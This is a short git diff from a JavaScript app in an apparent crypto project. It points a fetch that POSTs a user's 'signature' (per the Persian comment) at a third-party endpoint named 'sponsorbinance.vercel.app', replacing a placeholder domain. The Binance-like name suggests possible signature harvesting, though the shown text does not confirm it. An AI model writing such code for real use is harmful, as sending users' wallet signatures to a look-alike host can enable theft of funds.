@@ -75,7 +75,7 @@ function App() {
 
     // ارسال امضا به سرور جهت بررسی و ثبت لاگ
     try {
-      const resp = await fetch("https://YOUR-DOMAIN.com/crypto-project/send.php", {
+      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
